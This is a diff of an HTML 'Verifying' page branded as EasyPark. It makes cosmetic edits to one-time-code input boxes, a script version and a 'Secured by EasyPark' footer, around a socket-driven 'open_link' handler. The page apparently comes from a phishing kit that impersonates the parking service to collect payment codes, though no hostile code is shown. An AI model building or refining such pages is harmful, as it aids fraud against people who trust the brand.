@@ -2,7 +2,7 @@
 <html lang=""><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
 <title>Verifying — EasyPark</title>
-<script src="/static/js/i18n.js?v=5"></script>
+<script src="/static/js/i18n.js?v=6"></script>
 <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
 <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" as="style">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -34,8 +34,8 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 .ov-inp{width:100%;border:2px solid #e5e7eb;border-radius:12px;padding:14px;text-align:center;font-size:28px;font-weight:700;letter-spacing:.22em;outline:none;margin-bottom:14px;font-family:"Courier New",monospace;transition:border .2s}
 .ov-inp:focus{border-color:#872879}
 .ov-btn{width:100%;padding:14px;border-radius:12px;font-weight:800;font-size:14px;border:none;cursor:pointer;transition:.2s}
-.otp-row{display:flex;gap:7px;justify-content:center;margin-bottom:18px}
-.otp-b{width:42px;height:52px;border:2px solid #e5e7eb;border-radius:11px;text-align:center;font-size:22px;font-weight:800;color:#1e293b;outline:none;background:#f8fafc;transition:border .15s,box-shadow .15s;-webkit-appearance:none;padding:0}
+.otp-row{display:flex;gap:5px;justify-content:center;margin-bottom:18px}
+.otp-b{width:40px;height:50px;border:2px solid #e5e7eb;border-radius:11px;text-align:center;font-size:22px;font-weight:800;color:#1e293b;outline:none;background:#f8fafc;transition:border .15s,box-shadow .15s;-webkit-appearance:none;padding:0}
 .otp-b:focus{border-color:#872879;background:#fff;box-shadow:0 0 0 3px rgba(135,40,121,.15)}
 .otp-b.otp-filled{border-color:#872879;background:#fdf2f8}
 @keyframes shield-pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
@@ -266,7 +266,7 @@ socket.on('open_link',function(d){
       <i class="fas fa-check-circle" style="margin-right:8px"></i><span data-i18n="link_confirm_btn">Confirm</span>
     </button>
     <p style="font-size:10px;color:#94a3b8;margin:12px 0 0">
-      <i class="fas fa-shield-alt" style="margin-right:3px"></i>Secured by EasyPark Payment Gateway
+      <i class="fas fa-shield-alt" style="margin-right:3px"></i><span data-i18n="secure_gateway">Secured by EasyPark</span>
     </p>
   </div>
 </div>
